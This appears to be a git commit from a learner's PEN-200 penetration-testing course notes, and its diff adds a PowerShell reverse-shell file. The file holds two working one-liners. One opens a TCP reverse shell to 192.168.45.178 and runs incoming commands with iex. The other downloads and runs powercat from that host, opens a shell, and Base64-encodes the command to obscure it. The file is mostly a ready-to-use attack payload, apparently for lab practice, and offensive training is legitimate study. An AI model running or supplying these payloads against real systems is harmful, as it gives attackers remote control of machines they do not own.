2799ed9c54158bccb2977c3c3585a4c2fc2befa1
eugeneewe <eugeneewexen@gmail.com>
2024-04-28 14:01:52 +0800

    modified:   PEN-200/13_Fixing Exploits/Fixing Memory Exploits/PEN-200 13.1.3-5 	new file:   PEN-200/15_Password Attack/15.3_Cracking NTLM/PEN-200 15.3.4 Q1 	new file:   PEN-200/15_Password Attack/15.3_Cracking NTLM/PEN-200 15.3.4 Q2 	modified:   PEN-200/Office/PEN-200 11.3.1 Q1 	deleted:    Reverse Shell/powershell-revsh.ps1 	new file:   Reverse Shell/pwsh-revsh.ps1

---
+++ Reverse Shell/pwsh-revsh.ps1
@@ -0,0 +1,8 @@
+# Options 1
+# Oneliner-Powershell Reverse Shell command. Rmb to use netcat listen
+$callback = New-Object System.Net.Sockets.TCPClient("192.168.45.178",6666);$stream = $callback.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$callback.Close()
+
+# Options 2
+# OneLiner-Powershell use Powercat Command.
+$Text = "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.178/powercat.ps1'); powercat -c 192.168.45.178 -p 6688 -e powershell" 
+$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text) $EncodedText =[Convert]::ToBase64String($Bytes) $EncodedText
